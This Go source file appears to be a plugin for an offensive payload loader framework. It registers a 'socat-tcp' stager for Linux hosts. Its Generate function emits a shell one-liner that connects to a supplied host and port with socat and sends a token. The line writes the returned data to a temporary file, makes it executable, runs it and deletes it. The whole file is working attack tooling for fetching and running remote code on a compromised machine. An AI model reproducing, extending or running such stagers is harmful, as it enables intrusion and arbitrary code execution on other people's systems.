package loader

import "fmt"

type socatTCP struct{}

func init() { Register(&socatTCP{}) }

func (s *socatTCP) Name() string        { return "socat-tcp" }
func (s *socatTCP) Description() string { return "socat TCP pipe (no TLS, raw listener)" }
func (s *socatTCP) RequiresTool() string { return "socat" }

func (s *socatTCP) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (s *socatTCP) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`f=$(mktemp);(printf '%%s\n' '%s';sleep 1)|socat - TCP:%s:%s >$f;chmod +x $f;$f;rm -f $f`,
		opts.Token, opts.Host, opts.Port,
	), nil
}
